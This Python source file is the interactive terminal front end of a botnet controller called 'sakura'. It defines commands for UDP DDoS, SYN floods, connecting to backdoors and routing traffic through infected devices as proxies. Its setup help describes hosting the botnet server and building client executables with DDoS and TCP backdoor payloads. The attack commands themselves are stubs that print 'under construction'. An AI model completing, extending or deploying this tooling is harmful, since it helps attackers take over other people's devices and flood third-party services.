import sys, os
import colorama
import termcursor
from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import Suggestion, ThreadedAutoSuggest, AutoSuggest
from prompt_toolkit.key_binding import KeyBindings

COMMANDS = {"kill": ("Stop all workers", "Usage:\n\tkill\n\tstop"),
             "ddos":("Start ddos attack", "Usage:\n\tddos udp example.com 443\t || DDOS example.com:443\n\tddos udp example.com 443 15\t || DDOS example.com:443 (15 workers)"), 
             "help":("Show help", "Usage:\n\thelp\n\thelp setup\n\thelp <command>"),
             "synflood":("Start SYNFlood", "Usage:\n\tpython3 sakura.py SYNFLOOD example.com || SYNFlood example.com"), 
             "exit":("Exit from sakura terminal", "Usage:\n\texit"),
             "restart":("Restart sakura terminal", "Usage:\n\trestart"),
             "clear":("Clear sakura terminal", "Usage:\n\tclear"),
             "shell":("Connect via backdoor", "Usage:\n\tshell example.com:8282"),
             "stats":("Show stats for tags, regions, devices.", "Usage:\n\tstats"),
             "proxy":("Connect to proxy.", "Usage:\n\tproxy random\t || Select random device, use them as proxy")}

### -=-=-=- PROMPT SESSION -=-=-=- ###

class ListAutoSuggest(AutoSuggest):
    def get_suggestion(self, buffer, document):
        text = document.text
        for cmd in list(COMMANDS):
            if cmd.startswith(text) and cmd != text:
                return Suggestion(cmd[len(text):])
        return None

kb = KeyBindings()
session = PromptSession(
    auto_suggest=ThreadedAutoSuggest(ListAutoSuggest()),
    key_bindings=kb,
)

### -=-=-=- BINDINGS -=-=-=- ###

def on_exit():
    print(colorama.Style.RESET_ALL)
    print("\033[H\033[J")
    raise SystemExit

@kb.add("tab")
def _(event):
    buffer = event.app.current_buffer

    if buffer.suggestion:
        buffer.insert_text(buffer.suggestion.text)
    else:
        buffer.insert_text("    ")

@kb.add("c-l")
def _(event):
    event.app.renderer.clear()

@kb.add("c-k")
def _(event):
    buffer = event.app.current_buffer
    buffer.delete(len(buffer.text) - buffer.cursor_position)

@kb.add("c-c", "c-d")
def _(event):
    event.app.exit()
    on_exit()

### -=-=-=- CORE -=-=-=- ###

def eval_command(f: tuple[str, list[str]]):
    args = f[1]
    match f[0]:
        case "help":
            if len(args) > 0:
                match args[0]:
                    case "setup":
                        print(f"""{colorama.Fore.GREEN}||| How to setup sakura:{colorama.Style.RESET_ALL}
{colorama.Fore.LIGHTRED_EX}|| Setup server{colorama.Style.RESET_ALL}
{colorama.Fore.YELLOW}| Use your VPS{colorama.Style.RESET_ALL}
   {colorama.Fore.LIGHTCYAN_EX}If you have VPS server, you can use them as host.{colorama.Style.RESET_ALL}
     1. Build executable: run 'build server'.
     2. Load executable to your server.
     3. Run, setup username and password.
     | Done! Connect to server via 'connect <host>'
{colorama.Fore.YELLOW}| Use this machine{colorama.Style.RESET_ALL}
   {colorama.Fore.RED}[WARNING]{colorama.Fore.LIGHTCYAN_EX} Use this only if you have 'white' (public) ip!{colorama.Style.RESET_ALL}
    1. Setup server: run 'build self-host'
    | Done! Now you're hosting server for your botnet!

{colorama.Fore.LIGHTRED_EX}|| Build executable for clients{colorama.Style.RESET_ALL}
{colorama.Fore.YELLOW}| Setting up executable{colorama.Style.RESET_ALL}
   {colorama.Fore.LIGHTCYAN_EX}Apply options via 'build opts <option>'
   Check applied options - 'build opts'
   Clear options list - 'build opts clear'{colorama.Style.RESET_ALL}
    - TAG      > tag - identifier for this executable.
    - PAYLOAD  > payload - modules to load. Select all by typing 'all'. Example: 'ddos,backdoor'
    - BACKDOOR > backdoor - use only if you have module 'backdoor'. Value - ports to bind tcp backdoor. Example: '65532,65531.65530,8282'
{colorama.Fore.YELLOW}| Building executable{colorama.Style.RESET_ALL}
   {colorama.Fore.LIGHTCYAN_EX}Build via 'build client <type>'. Here's list of all types:{colorama.Style.RESET_ALL}
    - SOURCE   > Client source code on python. Ready for building on platforms, other than {sys.platform}.
    - DEFAULT  > Default build on pyinstaller for {sys.platform}. Icon will not be changed
    - CUSTOM   > Customisable build (based on pyinstaller). Change icon, name. Use these tags: ICON; NAME;""")
                        return
                    case _:
                        for command in COMMANDS:
                            if command == args[0]:
                                print(f"Description: {COMMANDS[command][0]}")
                                print(COMMANDS[command][1])
                                return
            for command in COMMANDS:
                print(f"{command} {(8-len(command))*' '} | {COMMANDS[command][0]}")
            print(f"\n{colorama.Style.BRIGHT}If you didn't know, how to setup sakura, please run 'help setup'{colorama.Style.RESET_ALL}")
        case "kill":
            print(".. under construction ..")
        case "ddos":
            print(".. under construction ..")
        case "shell":
            print(".. under construction ..")
        case "clear":
            print("\033[H\033[J\n")
        case "synflood":
            print(".. under construction ..")
        case "status":
            print(".. under construction ..")
        case "proxy":
            print(".. under construction ..")
        case "stats":
            print(".. under construction ..")
        case "exit":
            on_exit()
        case "restart":
            os.system(" ".join(sys.orig_argv))
            on_exit()
        case _:
            print("idk th command. type \"help\" for list of avaliable commands")

def main(argv: list[str] | None = None) -> None:
    if argv == None: argv = []
    print(\
"\033[H\033[J"+rf"""{colorama.Style.BRIGHT}           _                    
          | |                   
 ___  __ _| | ___   _ _ __ __ _ 
/ __|/ _` | |/ / | | | '__/ _` |
\__ \ (_| |   <| |_| | | | (_| |
|___/\__,_|_|\_\\__,_|_|  \__,_|{colorama.Style.NORMAL}{colorama.Style.DIM} botnet{colorama.Style.RESET_ALL}
""")
    while 1:
        command = session.prompt(f"botnet@sakura $ ")
        if command == "":
            continue
        cmd = command.split(" ")
        try: termcursor.hidecursor()
        except: pass
        eval_command((cmd[0], cmd[1:]))

### -=-=-=- RUNNING -=-=-=- ###

if __name__ == "__main__":
    try:
        main(sys.argv)
    except (KeyboardInterrupt, EOFError):
        on_exit()